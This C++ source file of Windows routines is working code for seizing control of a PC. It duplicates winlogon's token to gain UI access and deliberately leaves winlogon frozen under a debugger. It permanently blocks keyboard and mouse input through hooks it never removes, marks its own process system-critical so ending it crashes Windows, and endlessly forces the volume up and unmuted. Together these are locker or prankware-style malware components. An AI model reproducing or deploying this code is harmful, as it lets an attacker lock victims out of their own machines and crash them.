#include "SysControl.h"
#include "Helper.h"
#include "EZAudioClient.h"
#include <tlhelp32.h>
#include <thread>

void AdjustPrivilege(LPCTSTR privilege, BOOL enabled)
{
	LUID luid;
	if (!LookupPrivilegeValue(NULL, privilege, &luid))
	{
		ThrowSysError();
	}

	TOKEN_PRIVILEGES tp;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = 0;
	if (enabled) {
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}

	HANDLE currentToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &currentToken)) {
		ThrowSysError();
	}

	if (!AdjustTokenPrivileges(currentToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
	{
		ThrowSysError();
	}
	// Required secondarry check because AdjustTokenPrivileges returns successful if some but not all permissions were adjusted.
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
		ThrowSysError();
	}

	CloseHandle(currentToken);
}

DWORD GetWinlogonPID() {
	// Create a snapshot.
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	// Search through running processes using the snapshot.
	Process32First(snapshot, &processEntry);
	do {
		// If the current process is winlogon.exe return its PID.
		if (lstrcmp(processEntry.szExeFile, L"winlogon.exe") == 0) {
			DWORD winlogonPID = processEntry.th32ProcessID;
			CloseHandle(snapshot);
			return winlogonPID;
		}
	} while (Process32Next(snapshot, &processEntry));

	// Cleanup and return 0 because winlogon.exe could not be found.
	CloseHandle(snapshot);
	return 0;
}

BOOL IsAdmin() {
	// Open the current process token.
	HANDLE token;
	OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token);

	// Check if the current process token has UI Access already.
	_TOKEN_ELEVATION tokenElevation = { };
	DWORD returnLength = 0;
	GetTokenInformation(token, TokenElevation, &tokenElevation, sizeof(DWORD), &returnLength);

	// Close the handle to the current process token we opened earlier.
	CloseHandle(token);

	// tokenInformation is set by GetTokenInformation to 1 if UIAccess is granted otherwise it is 0.
	return tokenElevation.TokenIsElevated != 0;
}
void RelaunchAsAdmin() {
	// Get the path to the current exe
	TCHAR szPath[MAX_PATH];
	GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath));

	// Create a shell execute info to launch the current exe with a UAC prompt.
	SHELLEXECUTEINFO sei = { sizeof(SHELLEXECUTEINFO) };
	sei.lpVerb = L"runas";
	sei.lpFile = szPath;

	// Launch the shell execute info with the shell.
	ShellExecuteEx(&sei);
}

BOOL HasUIAccess() {
	// Open the current process token.
	HANDLE token;
	OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token);

	// Check if the current process token has UI Access already.
	DWORD tokenUIAccess = 0;
	DWORD returnLength = 0;
	GetTokenInformation(token, TokenUIAccess, &tokenUIAccess, sizeof(DWORD), &returnLength);

	// Close the handle to the current process token we opened earlier.
	CloseHandle(token);

	// tokenInformation is set by GetTokenInformation to 1 if UIAccess is granted otherwise it is 0.
	return tokenUIAccess != 0;
}
HANDLE CreateUIAccessToken() {
	// Open the current process token.
	HANDLE currentToken;
	OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE, &currentToken);

	// Get the process ID of winlogon.
	DWORD winlogonPID = GetWinlogonPID();

	// Open a handle to the winlogon process.
	HANDLE winlogon = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, winlogonPID);

	// Get the winlogon process token.
	HANDLE winlogonToken;
	OpenProcessToken(winlogon, TOKEN_QUERY | TOKEN_DUPLICATE, &winlogonToken);

	// Duplicate the winlogon process token so we can use it.
	HANDLE winlogonTokenCopy;
	DuplicateTokenEx(winlogonToken, TOKEN_IMPERSONATE, NULL, SecurityImpersonation, TokenImpersonation, &winlogonTokenCopy);

	// Set the token of the current thread to that one we just stole from winlogon.
	(void)SetThreadToken(NULL, winlogonTokenCopy);

	// Duplicate the current token.
	HANDLE currentTokenCopy;
	DuplicateTokenEx(currentToken, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_DEFAULT, NULL, SecurityAnonymous, TokenPrimary, &currentTokenCopy);

	// Give UIAccess to the copy of the current token we just made.
	BOOL uiAccess = TRUE;
	SetTokenInformation(currentTokenCopy, TokenUIAccess, &uiAccess, sizeof(uiAccess));

	// Set the token of the current thread back to the original token.
	(void)SetThreadToken(NULL, NULL);

	//Return and cleanup
	CloseHandle(currentToken);
	CloseHandle(winlogon);
	CloseHandle(winlogonToken);
	CloseHandle(winlogonTokenCopy);
	return currentTokenCopy;
}
void RelaunchWithUIAccess() {
	// Get a token with UIAccess
	HANDLE uiAccessToken = CreateUIAccessToken();

	// Launch the current process again with the new token.
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	GetStartupInfo(&si);
	CreateProcessAsUser(uiAccessToken, NULL, GetCommandLine(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	// Cleanup and return
	CloseHandle(uiAccessToken);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

BOOL IsInteractive() {
	HANDLE hToken = GetCurrentProcessToken();

	DWORD activeConsoleSessionId = WTSGetActiveConsoleSessionId();

	DWORD sessionId = 0;
	DWORD returnLength = 0;
	GetTokenInformation(hToken, TokenSessionId, &sessionId, sizeof(sessionId), &returnLength);

	CloseHandle(hToken);

	return (sessionId == activeConsoleSessionId);
}
HANDLE CreateInteractiveToken() {
	// Give the current process the "Assign primary tokens" permission.
	AdjustPrivilege(SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);

	// Give current process the "Act as part of the operating system" permission.
	AdjustPrivilege(SE_TCB_NAME, TRUE);

	// Open the current process.
	HANDLE currentProcess = GetCurrentProcess();

	// Open the current process token.
	HANDLE currentToken = NULL;
	if (!OpenProcessToken(currentProcess, TOKEN_ALL_ACCESS, &currentToken)) {
		ThrowSysError();
	}

	// Duplicate the current process token.
	HANDLE currentTokenCopy;
	if (!DuplicateTokenEx(currentToken, TOKEN_ALL_ACCESS, NULL, SecurityIdentification, TokenPrimary, &currentTokenCopy)) {
		ThrowSysError();
	}

	// Get current session id.
	DWORD sessionID = WTSGetActiveConsoleSessionId();

	// Change the session ID of the current process token copy to the current session ID.
	if (!SetTokenInformation(currentTokenCopy, TokenSessionId, &sessionID, sizeof(sessionID))) {
		ThrowSysError();
	}

	// Cleanup, revoke permissions, and return
	AdjustPrivilege(SE_ASSIGNPRIMARYTOKEN_NAME, FALSE);
	AdjustPrivilege(SE_TCB_NAME, FALSE);
	CloseHandle(currentToken);
	return currentTokenCopy;
}
void RestartInteractively() {
	// Get an interactive copy of the current token.
	HANDLE uiAccessToken = CreateInteractiveToken();

	// Launch the current process again with the new token.
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	GetStartupInfo(&si);
	CreateProcessAsUser(uiAccessToken, NULL, GetCommandLine(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	// Cleanup and return
	CloseHandle(uiAccessToken);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

void BreakWinlogon() {
	// Take SE_DEBUG_PERMISSION
	AdjustPrivilege(SE_DEBUG_NAME, TRUE);

	// Get winlogon PID
	DWORD winlogonPID = GetWinlogonPID();

	// Attach debugger to winlogon
	DebugActiveProcess(winlogonPID);

	// Open process handle to winlogon
	HANDLE winlogonHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, winlogonPID);

	// Break winlogon
	DebugBreakProcess(winlogonHandle);

	// The following code frees winlogon from its broken state. (We don't wanna do that)

	// Detach debugger
	// DebugActiveProcessStop(winlogonPID);

	// Free handle
	// CloseHandle(winlogonHandle);

	// Revoke SE_DEBUG_PERMISSION as it is no longer needed.
	// AdjustPrivilege(SE_DEBUG_NAME, FALSE);
}

LRESULT CALLBACK BlockingHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	return 1; // Returning 1 indicates the event has been handled and should not be sent to any other handlers.
}
void BlockInput()
{
	BOOL hookInitialized = FALSE;
	std::thread windowThread([&hookInitialized]() {
		// Set up the low level keyboard and mouse hooks to disable those devices.
		HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, BlockingHookProc, NULL, NULL);
		HHOOK mouseHook = SetWindowsHookEx(WH_MOUSE_LL, BlockingHookProc, NULL, NULL);

		hookInitialized = TRUE;

		MSG msg = { };
		while (GetMessage(&msg, NULL, 0, 0))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}

		// The following code removes the hooks we set earlier (We don't wanna do that)
		//UnhookWindowsHookEx(keyboardHook);
		//UnhookWindowsHookEx(mouseHook);
		});
	windowThread.detach();

	while (!hookInitialized) {}
}

typedef long (WINAPI* RtlSetProcessIsCritical) (
	IN BOOLEAN    bNew, // new setting for process
	OUT BOOLEAN* pbOld, // pointer which receives old setting (can be null)
	IN BOOLEAN    bNeedScb); // need system critical breaks
void MakeSystemCritical()
{
	// Take SE_DEBUG_PERMISSION
	AdjustPrivilege(SE_DEBUG_NAME, TRUE);

	// Load ntdll.dll
	HANDLE ntdll = LoadLibrary(L"ntdll.dll");

	// Bind SetCriticalProcess to the RtlSetProcessIsCritical function in ntdll.dll.
	RtlSetProcessIsCritical SetCriticalProcess;
	SetCriticalProcess = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");

	// Call the SetCriticalProcess function with TRUE to make the current process system critical.
	SetCriticalProcess(TRUE, NULL, FALSE);

	// Revoke the SE_DEBUG_PERMISSION as it is no longer needed.
	AdjustPrivilege(SE_DEBUG_NAME, FALSE);
}

void LockMaxVolume() {
	std::thread volumeLockThread([]() {
		while (true) {
			EZ::SetVolume(0.25f);
			EZ::SetMute(FALSE);
		}
		});
	volumeLockThread.detach();
}